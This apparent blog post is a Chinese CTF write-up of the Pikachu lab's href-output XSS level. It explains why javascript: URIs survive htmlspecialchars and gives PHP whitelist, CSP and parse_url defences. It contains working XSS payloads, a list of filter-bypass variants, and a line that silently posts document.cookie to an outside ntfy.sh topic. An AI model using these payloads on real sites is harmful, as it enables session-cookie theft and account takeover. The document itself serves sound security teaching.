---
layout: post
title: Pikachu - XSS之href输出 Writeup（转义对了，协议没管）
platform: pikachu
date: 2026-10-27 21:44:00 +0800
categories: CTF
---

Pikachu - XSS之href输出 Writeup（转义对了，协议没管）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：Cross-Site Scripting → xss之href输出
- 地址：`http://localhost/pikachu/vul/xss/xss_03.php`
- 题型：Web
- 考点：**URL 属性上下文**、危险协议（`javascript:`）、协议白名单

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
pikachu 源码放在 D:\phpstudy_pro\WWW\pikachu\
```

**页面形态**：

```text
请输入一个你常用的网站url地址,我就知道你是什么人

[                    ]  [submit]

阁下自己输入的url还请自己点一下吧     ← 你的输入被渲染成一个链接
```

**作者的提示（源码注释）**：

```php
//输出在a标签的href属性里面,可以使用javascript协议来执行js
//防御:只允许http,https,其次在进行htmlspecialchars处理
```

**★ 这句话把"漏洞"和"防御"都写清楚了。**

**✅ 实测结果（6 种输入对照）**

| 输入 | 渲染结果 | 结论 |
|---|---|---|
| `http://www.baidu.com` | `href='http://www.baidu.com'` | 正常 |
| **`javascript:alert(1)`** | **`href='javascript:alert(1)'`** | **无字符被转义 → 点了执行** |
| `' onclick='alert(1)` | `href='&#039; onclick=&#039;alert(1)'` | ✅ `'` 被转义 → 属性注入失败 |
| `data:text/html,<script>alert(1)</script>` | `href='data:text/html,&lt;script&gt;...'` | `<` `>` 转义，但浏览器还会拦 data: |
| ` javascript:alert(1)`（前导空格）| `href=' javascript:alert(1)'` | 原样（浏览器会去掉前导空白）|
| `JaVaScRiPt:alert(1)` | `href='JaVaScRiPt:alert(1)'` | 原样（协议名大小写不敏感）|

**浏览器实测（点击链接后）**：

```text
localhost 显示
PHPSESSID=h21jhq7u3kjrbu7gs6ih0jfvp5
[确定]
```

**★ 只弹出了 PHPSESSID，没弹出 `ant[uname]` / `ant[pw]` —— 因为那两个已经过期了（见下面分析）。**

**彩蛋**：

```text
输入 www.baidu.com（不带 http://）
→ 页面显示："我靠,我真想不到你是这样的一个人"
```

二、题目分析

**① 后端代码（这次 `ENT_QUOTES` 用对了）**

```php
<?php
// xss_03.php 第 20-32 行
if(isset($_GET['submit'])){
    if(empty($_GET['message'])){
        $html .= "<p class='notice'>叫你输入个url,你咋不听?</p>";
    }

    if($_GET['message'] == 'www.baidu.com'){          // 彩蛋
        $html .= "<p class='notice'>我靠,我真想不到你是这样的一个人</p>";
    } else {
        //输出在a标签的href属性里面,可以使用javascript协议来执行js
        //防御:只允许http,https,其次在进行htmlspecialchars处理
        $message = htmlspecialchars($_GET['message'], ENT_QUOTES);    // ★ 这次传了 ENT_QUOTES
        $html .= "<a href='{$message}'> 阁下自己输入的url还请自己点一下吧</a>";
    }
}
?>
```

**★ 和上一关（xss之htmlspecialchars）的对比**：

```php
// 上一关（第 8 关）
htmlspecialchars($x)                    // 默认 ENT_COMPAT → ' 不转 → 能注入属性

// 这一关（第 9 关）
htmlspecialchars($x, ENT_QUOTES)        // ' 也转 → 属性注入被堵住 ✅
```

**★ 所以上一关的漏洞在这里被修复了 —— 但出现了新的问题。**

**② 为什么 `javascript:alert(1)` 转义不了**

**看 `htmlspecialchars` 转义哪些字符**：

```
ENT_QUOTES 转义：
    &  →  &amp;
    <  →  &lt;
    >  →  &gt;
    "  →  &quot;
    '  →  &#039;
```

**看 payload**：

```
javascript:alert(1)
```

**★ 里面没有任何一个字符属于上面那五个 → 转义后原样不变。**

**★ 但浏览器解析 `href` 时，会先识别"协议（scheme）"**：

```
http://...      → 发起 HTTP 请求
https://...     → 发起 HTTPS 请求
javascript:...  → ★ 把后面的内容当 JS 执行
data:...        → 按 MIME 类型处理（可以构造 HTML）
vbscript:...    → 老 IE 的脚本协议
file://...      → 读本地文件
```

**★ 所以**：

```
"javascript:alert(1)" 在语法上完全合法
你无法用"转义"把它变成"无害的字符串"
→ 必须用"白名单"：只允许 http、https
```

**③ ⭐ 三层上下文模型（这是本关最重要的认知）**

**要防 XSS，先搞清楚数据输出在"哪一层"**：

```
┌──────────────────────────────────────────────────────────────┐
│  第 1 层：HTML 文本上下文                                       │
│      <p>{$x}</p>                                             │
│      危险字符：< >                                            │
│      防御：htmlspecialchars（默认就够）                         │
├──────────────────────────────────────────────────────────────┤
│  第 2 层：HTML 属性上下文                                       │
│      <a href='{$x}'>  <input value="{$x}">                   │
│      危险字符：引号（' 或 "）                                    │
│      防御：htmlspecialchars($x, ENT_QUOTES)                   │
├──────────────────────────────────────────────────────────────┤
│  第 3 层：URL 属性上下文  ← ★ 本关                              │
│      <a href="{$x}">  <img src="{$x}">  <form action="{$x}"> │
│      危险"协议"：javascript: / data: / vbscript:              │
│      防御：① 协议白名单（只允许 http/https）                     │
│            ② 再做 htmlspecialchars                             │
└──────────────────────────────────────────────────────────────┘
```

**★ 本关的代码满足了第 1、2 层（做了 ENT_QUOTES），但漏了第 3 层。**

**★ 这就是"上下文相关转义"的完整图景**：

```
不是"转义一次就安全"
而是"每个输出位置都要按它的规则处理"
```

**④ 为什么只弹出了 PHPSESSID**

**看 cookie 的生命周期**：

```php
// post_login.php / admin_login.php 里设置 ant 系列 cookie
setcookie('ant[uname]', $_POST['username'], time()+3600);          // ★ 1 小时后过期
setcookie('ant[pw]', sha1(md5($_POST['password'])), time()+3600);  // ★ 1 小时
```

**对比 PHP session cookie**：

```ini
; php.ini
session.cookie_lifetime = 0        ; ★ 0 = 关闭浏览器才失效（会话 cookie）
```

**★ 所以**：

```
上午 08:33 登录后台 → 设了 ant[uname] / ant[pw]（1 小时）
晚上 21:44 测试    → 已过 13 小时 → ant[*] 过期被浏览器删除
                   → 但 PHPSESSID 还在（会话 cookie）
```

**★ 这个细节说明**：

```
cookie 的"存活时间"直接影响 XSS 的危害窗口

★ 短期凭证（1 小时）→ 攻击窗口小
★ 长期凭证（30 天）→ 攻击窗口大
★ 会话凭证（关浏览器失效）→ 中等

★ 所以"记住我"功能要特别小心
```

**⑤ 页面的"诱导文案"本身也是攻击面**

**看页面的那句话**：

```html
<a href='{$message}'> 阁下自己输入的url还请自己点一下吧</a>
```

**★ 这行文字在"鼓励用户点击"**：

```
"阁下自己输入的url还请自己点一下吧"
        └──────────────┬──────────────┘
        天然的社工话术：让你觉得"这是我自己输的，点一下没事"
```

**★ 真实攻击中，攻击者会自己加话术**：

```
"这个网站检测你的常用网站，你会发现很有意思的东西：
 http://靶场/.../xss_03.php?message=javascript:..."

★ 利用好奇心 + 页面本身的"点一下"提示
★ 用户点的概率相当高
```

三、解题步骤

**第 1 步：先看正常功能**

**打开**：

```text
http://localhost/pikachu/vul/xss/xss_03.php
```

**输入**：`http://www.baidu.com`

**点 submit**

**页面出现**：

```
阁下自己输入的url还请自己点一下吧
```

**★ 点它会跳转到百度（正常功能）。**

**第 2 步：判断防护水平（试 `<b>` 和单引号）**

**输入**：

```html
<b>test</b>
```

**F12 → 元素**：

```html
<a href='&lt;b&gt;test&lt;/b&gt;'>&lt;b&gt;test&lt;/b&gt;</a>
```

**★ `<` `>` 被转义了。**

**输入**：

```
' onclick='alert(1)
```

**F12 → 元素**：

```html
<a href='&#039; onclick=&#039;alert(1)'>...</a>
```

**★ 单引号也被转义了（这次是 ENT_QUOTES）。**

**★ 结论**：

```
属性注入的路被堵死了
→ 不能加 onclick / onmouseover
→ 也不能闭合标签插新标签
```

**第 3 步：⭐ 换思路 —— 用 `javascript:` 协议**

**输入**：

```
javascript:alert(1)
```

**点 submit**

**F12 → 元素**：

```html
<a href='javascript:alert(1)'> 阁下自己输入的url还请自己点一下吧</a>
        └──────┬──────┘
        一个字符都没被转义（因为没有特殊字符）
```

**第 4 步：点那个链接 → 弹窗**

**★ 弹出 `1` → XSS 成立。**

**第 5 步：偷 cookie**

**输入**：

```
javascript:alert(document.cookie)
```

**点链接 → 弹窗**：

```
PHPSESSID=h21jhq7u3kjrbu7gs6ih0jfvp5
```

**★ 注意：只有 PHPSESSID，没有 `ant[*]` —— 因为那俩已过期。**

**★ 完整的危害**：

```javascript
// 真实攻击的 payload（静默外带）
javascript:fetch('https://ntfy.sh/你的topic',{method:'POST',body:document.cookie,mode:'no-cors'})
```

**第 6 步：对比 —— 为什么上一关能打这一关不能**

| 测试 | 第 8 关（htmlspecialchars 默认）| 第 9 关（ENT_QUOTES）|
|---|---|---|
| `' onclick='alert(1)` | ✅ `<a href='' onclick='alert(1)'>` | ❌ `&#039;` 被转义 |
| `javascript:alert(1)` | ✅ 能（href 值）| ✅ **也能** |

**★ 结论**：

```
第 8 关：转义不完整 → 属性注入
第 9 关：转义完整了 → 但协议没管

★ 两个不同层面的问题
★ 修了其中一个，另一个还在
```

**第 7 步：试试 `data:` 协议（现代浏览器会拦）**

**输入**：

```
data:text/html,<script>alert(1)</script>
```

**F12 → 元素**：

```html
<a href='data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;'>...</a>
```

**★ `<` `>` 被转成 `&lt;` `&gt;`，但注意**：

```
HTML 属性值在解析时会被【实体解码】：

    href 属性的原始文本：data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;
    浏览器读出的值：      data:text/html,<script>alert(1)</script>
    
★ 所以转义在"属性值"这个位置对 data: 无效
★ 转义只影响"HTML 解析"，不影响"URL 语义"
```

**★ 但点击后没反应**：

```
Chrome 从 2017 年（Chrome 60+）起，禁止从链接【导航】到 data: URL
原因：钓鱼（data: 可以伪造任意页面，地址栏却显示可信域名）

★ 所以 data: 在 href 里现在基本用不了
★ 但它在 <iframe src> / <object data> 里可能还能用
```

**第 8 步：试试协议混淆（绕过简单过滤用）**

**如果代码做了简单的 `strpos('javascript:')` 检查，可以这样绕**：

```
JaVaScRiPt:alert(1)          ← 大小写（协议名不敏感）
 javascript:alert(1)         ← 前导空格（浏览器会去掉）
java\tscript:alert(1)        ← Tab（浏览器解析 scheme 时会去掉）
java\nscript:alert(1)        ← 换行
\0javascript:alert(1)        ← NUL 字节
&#106;avascript:alert(1)     ← HTML 实体（属性值里会被解码）
```

**★ 本关没有协议过滤，所以直接用 `javascript:` 就行。**

**★ 但如果遇到过滤，这些变形就是下一步。**

四、延伸知识

**① 危险协议清单**

| 协议 | 危害 | 现代浏览器状态 |
|---|---|---|
| **`javascript:`** | 直接执行 JS | ⚠️ **仍然有效**（需用户点击）|
| `data:` | 可构造任意 HTML（钓鱼）| ⚠️ href 导航被拦，iframe/object 里可能有效 |
| `vbscript:` | 老 IE 的脚本 | ❌ 已废弃 |
| `file:` | 读本地文件 | ⚠️ 受限 |
| `blob:` | 可构造页面 | ⚠️ 需配合其他漏洞 |
| `chrome:` / `about:` | 特殊页面 | ⚠️ 部分有效 |
| `mailto:` / `tel:` | 无害 | ✅ |
| `ftp:` | 无害（已废弃）| ✅ |

**★ 白名单应该只允许**：

```
http:
https:
相对路径（/path、./path、#anchor）
```

**② PHP 里怎么做协议白名单**

**❌ 错误做法 1：字符串匹配**

```php
if (strpos($url, 'javascript:') === false) {
    echo "<a href='" . htmlspecialchars($url, ENT_QUOTES) . "'>链接</a>";
}
```

**绕过**：

```
JaVaScRiPt:alert(1)          ← 大小写
 javascript:alert(1)         ← 前导空格
java\tscript:alert(1)        ← Tab
```

**❌ 错误做法 2：只用 `filter_var`**

```php
if (filter_var($url, FILTER_VALIDATE_URL)) {
    // 以为安全了
}
```

**问题**：

```
filter_var 只校验"格式像不像 URL"
它认为 javascript:alert(1) 是合法的 URL（有 scheme）
→ 照样放行
```

**✅ 正确做法：解析 + 白名单**

```php
function safeUrl(string $url): string {
    $url = trim($url);

    // 允许相对路径
    if ($url === '' || $url[0] === '/' || $url[0] === '#') {
        return htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
    }

    // 解析
    $parts = parse_url($url);
    $scheme = strtolower($parts['scheme'] ?? '');

    // 白名单
    $allowed = ['http', 'https'];
    if (!in_array($scheme, $allowed, true)) {
        return '#';      // 或者直接报错
    }

    return htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
}
```

**★ 注意 `parse_url` 的坑**：

```php
parse_url('javascript:alert(1)');
// → ['scheme' => 'javascript', 'path' => 'alert(1)']
// ★ 能正确识别出 scheme，所以可以用来判断

parse_url('//evil.com/x');
// → ['host' => 'evil.com', 'path' => '/x']
// ★ 没有 scheme！这是"协议相对 URL"
// ★ 如果白名单只检查 scheme 存在，这种会被漏过
// ★ 需要额外处理
```

**③ `parse_url` 的经典绕过（PHP bug #62896 等）**

**历史上有过很多 `parse_url` 和浏览器解析不一致的案例**：

```php
parse_url('http://evil.com\\@good.com/');
// PHP 认为是 host = evil.com
// 某些浏览器可能认为是 good.com
// ★ 解析差异 = 绕过
```

**★ 所以最稳的做法是**：

```
① 用白名单（只允许 http/https）
② 对 URL 做规范化（去掉多余空白、控制字符）
③ 再用 htmlspecialchars 输出
④ 如果有条件，加 CSP 兜底
```

**④ 浏览器对 `javascript:` 的限制**

**现代浏览器对 `javascript:` 的一些限制**：

```
① 必须是"用户手势"触发
   自click 的 <a href="javascript:..."> 不会执行
   
② CSP 可能禁止
   Content-Security-Policy: script-src 'self'
   → javascript: URI 被视为内联脚本 → 被拦
   
③ 部分浏览器在特定上下文禁用
   · 在 <iframe sandbox> 里
   · 在扩展的 content script 里
```

**★ 但"用户点击"在社工场景里太容易了**：

```
攻击者只需要一句"点这里看看"
→ 用户点了 → JS 执行
→ javascript: 依然是最有效的 href XSS 手法
```

**⑤ 真实世界的 href XSS 案例**

**案例 1：个人主页/签名档**

```
很多论坛允许用户填"个人网站"
→ 输出成 <a href="用户输入">我的主页</a>
→ 填 javascript:alert(1) → 谁点谁中招

★ 这类功能是 href XSS 的重灾区
```

**案例 2：短链接服务**

```
短链接跳转页：<a href="<?= $target ?>">继续访问</a>
→ target 参数可控
→ javascript: 协议 → XSS
```

**案例 3：Markdown 渲染器**

```markdown
[点我](javascript:alert(1))
```

**★ 很多 Markdown 解析库（包括一些老版本的 marked、markdown-it）**
**历史上都出过"不校验 URL 协议"的问题。**

**★ 修复方式**：渲染链接前校验协议。

**⑥ 与上一关的完整对比**

| | 第 8 关 htmlspecialchars | 第 9 关 href输出 |
|---|---|---|
| **用的 flags** | 默认 `ENT_COMPAT` | `ENT_QUOTES` ✅ |
| **`'` 转义了吗** | ❌ 没有 | ✅ 转了 |
| **能注入属性吗** | ✅ 能（`' onclick='`）| ❌ 不能 |
| **输出位置** | `<a href='...'>` | `<a href='...'>` |
| **`javascript:` 能用吗** | ✅ 能 | ✅ **也能** |
| **漏洞本质** | 转义不完整 | 协议没校验 |
| **正确防御** | `ENT_QUOTES` | **协议白名单** |

**★ 两关连起来看，得到一个完整认知**：

```
① 转义要做对（flags 选对）
② 还要看上下文（属性？URL？JS？）
③ URL 上下文还需要协议白名单

★ 三者缺一不可
```

**⑦ 防御清单（href 场景）**

```php
// ✅ 完整防御
function renderLink(string $url, string $text): string {
    // 1. 去掉控制字符和多余空白
    $url = preg_replace('/[\x00-\x1F\x7F]/', '', trim($url));

    // 2. 协议白名单
    $scheme = strtolower(parse_url($url, PHP_URL_SCHEME) ?? '');
    if ($scheme !== '' && !in_array($scheme, ['http', 'https'], true)) {
        $url = '#';
    }

    // 3. 输出转义
    $safeUrl  = htmlspecialchars($url, ENT_QUOTES | ENT_HTML5, 'UTF-8');
    $safeText = htmlspecialchars($text, ENT_QUOTES | ENT_HTML5, 'UTF-8');

    return "<a href=\"{$safeUrl}\" rel=\"noopener noreferrer\" target=\"_blank\">{$safeText}</a>";
}
```

**★ `rel="noopener noreferrer"` 也很重要**：

```
防止：
    · 新页面通过 window.opener 操纵原页面（noopener）
    · Referer 泄露（noreferrer）
```

**★ CSP 兜底**：

```html
<meta http-equiv="Content-Security-Policy"
      content="script-src 'self'; object-src 'none'">
```

五、总结

- **本题核心：`htmlspecialchars(..., ENT_QUOTES)` 把转义做对了，但 `href` 的协议没有校验 → `javascript:` 协议依然可执行 JS。**

- **关键代码（两行）**：

```php
$message = htmlspecialchars($_GET['message'], ENT_QUOTES);   // ★ 转义对了
$html .= "<a href='{$message}'> 阁下自己输入的url还请自己点一下吧</a>";   // ★ 协议没管
```

- **⭐ 五个必记要点**：

```text
① 转义 ≠ 协议校验
   javascript:alert(1) 里没有 & < > " ' 五个字符
   → htmlspecialchars 完全无效
   → 但浏览器会执行它

② 三层上下文模型
   文本上下文 → 防 < >
   属性上下文 → 防引号
   URL 上下文 → ★ 防危险协议（本关）

③ 上一关 vs 这一关
   第 8 关：ENT_COMPAT → 单引号没转 → 属性注入
   第 9 关：ENT_QUOTES  → 属性注入堵住了 → 但协议没管

④ 危险协议清单
   javascript: （最有效，需点击）
   data:       （href 导航被拦，iframe 里可能有效）
   vbscript:   （已废弃）

⑤ 正确防御 = 白名单 + 转义
   先协议白名单（只允许 http/https）
   再 htmlspecialchars（ENT_QUOTES）
   再加 CSP 兜底
```

- **实测数据**：

```text
http://www.baidu.com        → href 原样                正常
javascript:alert(1)         → href 原样                ✅ 点了执行
' onclick='alert(1)         → &#039; onclick=&#039;     ❌ 被转义
data:text/html,<script>...  → &lt;script&gt;           ⚠️ 浏览器拦 data:
 javascript:alert(1)        → 原样（前导空格）          ✅ 也能用
JaVaScRiPt:alert(1)         → 原样                     ✅ 也能用

浏览器实测：
    javascript:alert(document.cookie)
    → 弹出 PHPSESSID=h21jhq7u3kjrbu7gs6ih0jfvp5
    → 只有 PHPSESSID（ant[*] 已过期，因为设了 1 小时寿命）

彩蛋：
    输入 www.baidu.com → "我靠,我真想不到你是这样的一个人"
```

- **XSS 模块进度**：

```text
✅ 反射型xss(get)      —— 直接拼接，需绕 maxlength
✅ 反射型xss(post)     —— 需登录 + 自动提交表单 + Pass-the-Hash
✅ 存储型xss           —— SQL 转义≠HTML 转义
✅ DOM型xss            —— 源=input（Self-XSS）
✅ DOM型xss-x          —— 源=URL（真可利用）
✅ xss之盲打           —— 打管理员 + 带外确认
✅ xss之过滤           —— 黑名单绕过
✅ xss之htmlspecialchars —— 默认 flags 的坑
✅ xss之href输出        —— 本题：协议没校验
⬜ xss之js输出          —— JS 上下文（最后一关）
```

**手工复现要点**：

```text
· 打开 xss_03.php，输入 http://www.baidu.com → 看正常链接
· 输入 <b>test</b> → F12 看 < > 是否转义
· 输入 ' onclick='alert(1) → F12 看 ' 被转成 &#039;（对比第 8 关）
· 输入 javascript:alert(1) → 点链接 → 弹窗
· 输入 javascript:alert(document.cookie) → 看只有 PHPSESSID
· 输入 www.baidu.com → 看彩蛋
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  href 是"URL 上下文"，比"属性上下文"多一层危险                   │
│                                                            │
│  转义只能防"HTML 语法注入"                                    │
│  防不了"语义合法但危险的值"                                    │
│                                                            │
│  javascript:alert(1)                                       │
│      → 没有特殊字符 → 转义无效                                │
│      → 但浏览器认识这个协议 → 执行 JS                          │
│                                                            │
│  ★ 唯一解：协议白名单（只允许 http/https）                     │
│  ★ 口诀：先白名单，再转义，最后 CSP 兜底                       │
└────────────────────────────────────────────────────────────┘
```
